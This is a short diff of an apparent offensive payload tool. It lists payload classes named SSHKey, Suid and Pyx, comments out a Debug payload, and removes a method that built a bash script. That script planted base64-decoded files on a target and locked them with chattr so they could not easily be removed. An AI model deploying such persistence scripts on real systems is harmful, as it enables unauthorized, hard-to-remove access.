@@ -12,7 +12,7 @@ import base64
 
 payloads = [
     #Cat(),
-    Debug(),
+    #Debug(),
     SSHKey(),
     Suid(),
     Pyx(),
@@ -38,19 +38,4 @@ class BasicPayload(Payload):
     def steps(self):
         return self.commands
 
-    def generate_script(self):
-        output = "#!/bin/bash\n\n"
 
-        for i in self.files:
-            data = open("./resources/" + i, "rb").read()
-            enc = base64.b64encode(data)
-            enc = enc.decode("ascii")
-            output += "chattr -i %s\n" % self.files[i]
-            output += "chmod +w %s\n" % self.files[i]
-            output += "printf '%s' | base64 -d > %s\n" % (enc, self.files[i])
-            output += "chmod -w %s\n" % self.files[i]
-            output += "chattr +i %s\n" % self.files[i]
-
-        for i in self.commands:
-            output += i + "\n"
-        return output
